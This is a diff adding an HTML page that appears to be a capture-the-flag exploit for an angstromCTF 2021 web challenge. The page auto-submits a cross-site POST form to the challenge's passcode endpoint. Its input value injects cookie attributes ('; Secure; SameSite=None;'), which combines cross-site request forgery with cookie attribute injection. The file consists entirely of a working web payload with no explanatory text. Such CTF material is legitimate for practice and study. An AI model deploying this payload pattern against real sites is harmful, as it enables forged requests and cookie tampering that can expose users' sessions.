@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+	<form action="https://jason.2021.chall.actf.co/passcode" name="csrf" method="POST">
+		<input name="passcode" value="; Secure; SameSite=None;">
+		<input type="submit">
+	</form>
+
+	<script>
+		csrf.submit();
+	</script>
+</body>
+</html>
